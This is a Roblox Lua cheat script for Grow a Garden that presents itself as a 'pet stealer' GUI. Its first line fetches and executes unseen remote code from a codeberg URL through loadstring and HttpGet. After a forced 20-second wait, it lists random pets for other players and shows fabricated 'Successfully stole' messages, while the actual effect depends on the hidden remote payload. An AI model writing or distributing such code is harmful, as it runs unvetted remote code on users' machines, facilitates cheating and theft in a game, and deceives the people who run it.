-- Load real pet spawner local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()

-- Pets to randomize from local allPets = { "Kitsune", "Raccoon", "Butterfly", "Disco Bee", "Corrupted Kitsune", "Dragonfly", "T-Rex" }

local player = game.Players.LocalPlayer local gui = Instance.new("ScreenGui") gui.Name = "PRStylePetStealer" gui.ResetOnSpawn = false gui.IgnoreGuiInset = true gui.Parent = player:WaitForChild("PlayerGui")

-- ‚è≥ Loading Screen local loadingFrame = Instance.new("Frame") loadingFrame.Size = UDim2.new(1, 0, 1, 0) loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0) loadingFrame.ZIndex = 10 loadingFrame.Parent = gui

-- Background Glow local glow = Instance.new("ImageLabel") glow.Name = "Glow" glow.BackgroundTransparency = 1 glow.Size = UDim2.new(1, 0, 1, 0) glow.Image = "rbxassetid://5576439030" glow.ImageColor3 = Color3.fromRGB(100, 100, 255) glow.ImageTransparency = 0.6 glow.ScaleType = Enum.ScaleType.Slice glow.SliceCenter = Rect.new(20, 20, 280, 280) glow.Parent = loadingFrame

-- Loading Message local message = Instance.new("TextLabel", loadingFrame) message.Size = UDim2.new(0.8, 0, 0.1, 0) message.Position = UDim2.new(0.1, 0, 0.4, 0) message.Text = "üîÑ Loading your script... Please wait 20 seconds" message.TextColor3 = Color3.new(1, 1, 1) message.BackgroundTransparency = 1 message.TextScaled = true message.Font = Enum.Font.GothamBold

-- Wait and remove loading task.wait(20) loadingFrame:Destroy()

-- Show rest of GUI local mainGui = Instance.new("Frame") mainGui.Name = "MainUI" mainGui.Size = UDim2.new(0.6, 0, 0.6, 0) mainGui.Position = UDim2.new(0.2, 0, 0.2, 0) mainGui.BackgroundColor3 = Color3.fromRGB(30, 30, 30) mainGui.Parent = gui

-- Add a close button local closeBtn = Instance.new("TextButton") closeBtn.Size = UDim2.new(0, 100, 0, 40) closeBtn.Position = UDim2.new(1, -110, 0, 10) closeBtn.Text = "Close" closeBtn.Parent = mainGui closeBtn.MouseButton1Click:Connect(function() mainGui.Visible = false end)

-- Create player list and pet buttons local UIS = game:GetService("UserInputService") local playersList = Instance.new("Frame") playersList.Size = UDim2.new(0.25, 0, 1, 0) playersList.BackgroundColor3 = Color3.fromRGB(45, 45, 45) playersList.Parent = mainGui

local petList = Instance.new("Frame") petList.Size = UDim2.new(0.75, 0, 1, 0) petList.Position = UDim2.new(0.25, 0, 0, 0) petList.BackgroundColor3 = Color3.fromRGB(35, 35, 35) petList.Parent = mainGui

local function createPlayerButton(p) local button = Instance.new("TextButton") button.Size = UDim2.new(1, 0, 0, 30) button.Text = p.Name button.BackgroundColor3 = Color3.fromRGB(60, 60, 60) button.TextColor3 = Color3.new(1, 1, 1) button.Parent = playersList

button.MouseButton1Click:Connect(function()
	petList:ClearAllChildren()
	local petCount = math.random(4, 5)
	local chosen = {}
	for i = 1, petCount do
		table.insert(chosen, allPets[math.random(1, #allPets)])
	end
	for _, pet in ipairs(chosen) do
		local petBtn = Instance.new("TextButton")
		petBtn.Size = UDim2.new(1, 0, 0, 40)
		petBtn.Text = "Steal " .. pet
		petBtn.TextColor3 = Color3.new(1,1,1)
		petBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
		petBtn.Parent = petList
		petBtn.MouseButton1Click:Connect(function()
			Spawner.SpawnPet(pet)
			local msg = Instance.new("TextLabel")
			msg.Size = UDim2.new(1, 0, 0, 40)
			msg.Position = UDim2.new(0, 0, 0, 0)
			msg.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
			msg.Text = "‚úÖ Successfully stole " .. pet .. " from " .. p.Name
			msg.TextColor3 = Color3.new(1, 1, 1)
			msg.Font = Enum.Font.GothamBold
			msg.TextScaled = true
			msg.ZIndex = 100
			msg.Parent = gui
			task.delay(3, function()
				msg:Destroy()
			end)
		end)
	end
end)

end

for _, plr in ipairs(game.Players:GetPlayers()) do if plr ~= player then createPlayerButton(plr) end end

-- Toggle with RightShift UIS.InputBegan:Connect(function(input) if input.KeyCode == Enum.KeyCode.RightShift then mainGui.Visible = not mainGui.Visible end end)

